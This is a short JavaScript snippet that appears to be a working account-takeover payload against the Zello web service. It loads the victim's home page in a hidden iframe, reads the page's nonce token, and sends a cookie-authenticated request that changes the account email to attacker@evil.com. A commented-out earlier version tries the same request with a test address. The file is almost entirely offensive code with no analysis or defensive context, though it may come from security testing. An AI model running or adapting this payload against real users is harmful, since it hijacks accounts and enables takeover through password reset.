/*fetch('/user/update_profile', {
   method: 'POST',
   body: new URLSearchParams({
     email: 'testemail@gmail.com',
     phone: '',
     safe_info_pass_update: 0,
     nonce: Zello['nonce']   
   }),
   credentials: 'include'
});
*/
const iframe = document.createElement('iframe');
iframe.src = 'https://my.zello.com/user/home';
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = function() {
  try {
    // Access the Zello object from the iframe's window
    const nonce = iframe.contentWindow.Zello['nonce'];
    
    fetch('https://my.zello.com/user/update_profile', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({
        email: 'attacker@evil.com',
        phone: '',
        safe_info_pass_update: 0,
        nonce: nonce
      }),
      credentials: 'include'
    });
  } catch(e) {
    console.error('Cannot access iframe:', e);
  }
};
